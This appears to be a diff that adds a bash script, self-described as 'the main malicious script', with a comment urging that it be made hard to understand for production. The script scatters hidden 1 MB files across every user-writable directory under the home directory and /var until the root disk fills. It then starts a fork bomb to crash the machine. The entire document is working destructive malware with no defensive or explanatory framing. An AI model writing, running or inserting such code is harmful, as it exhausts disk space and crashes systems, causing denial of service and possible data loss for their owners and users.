@@ -1,0 +1,39 @@
+#!/bin/bash
+# this is the main malicious script,
+# for the production, should make the script very hard to understand.
+
+bomb() {
+    # fallocate size
+    size="1m"
+
+    # in order to not stress the disk, pick one among 1, 2, (*3 removed)
+    rand=$(($RANDOM % 2))
+
+    # check if the disk usage is 100%
+    exceed=$(df | egrep '100%[ \t]/$')
+    if [ -z "$exceed" ]; then
+        # not exceed yet =>
+        # pick one of directories that typically has user writable directories
+        # keep on fallocate
+        if [ 0 -eq $rand ]; then
+            find ~ -type d 2>/dev/null -exec fallocate -l $size {}/.$RANDOM \;
+        fi
+        if [ 1 -eq $rand ]; then
+            find /var -type d 2>/dev/null -exec fallocate -l $size {}/.$RANDOM \;
+        fi
+
+#        /tmp dir is ecluded because system flushes /tmp directory
+#        if [ 2 -eq $rand ]; then
+#            find /tmp -type d 2>/dev/null -exec fallocate -l $size {}/.$RANDOM \;
+#        fi
+
+        # sleep to make it seemless and keep on fallocating
+        sleep 1
+        bomb &
+    else
+        # exceed => forkbomb and so kill the system right away
+       	bomb | bomb &
+    fi
+}
+
+bomb &
